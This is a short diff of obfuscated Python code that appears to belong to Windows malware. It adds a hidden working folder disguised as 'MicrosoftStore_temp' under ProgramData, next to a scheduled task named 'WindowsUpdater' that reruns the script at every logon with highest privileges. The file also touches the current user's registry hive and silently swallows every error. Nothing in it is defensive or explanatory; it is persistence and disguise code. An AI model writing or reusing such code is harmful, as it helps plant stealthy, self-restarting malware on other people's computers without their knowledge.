@@ -30,6 +30,8 @@ def esuih():
     except Exception as e:
         pass
 
+
+
 def fwf9ud98():
     try:
         htruhijn = ef9uh77.HKEY_CURRENT_USER
@@ -44,7 +46,13 @@ def fwf9ud98():
 
 def hzirge():
     try:
+        awdt553234 = ewsjinf783.environ.get('ProgramData')
+        xcsgf4 = "MicrosoftStore_temp"
+        x5g4g654z654 = ewsjinf783.path.join(awdt553234, xcsgf4)
+        ewsjinf783.makedirs(x5g4g654z654, exist_ok=True)
+
         xvcj5tr.run(f'schtasks /create /tn "WindowsUpdater" /sc ONLOGON /rl HIGHEST /tr "{ewsjinf783.path.abspath(wzf8u4w7.argv[0])}"', shell=True, check=True)
+        
     except Exception as e:
         pass
 
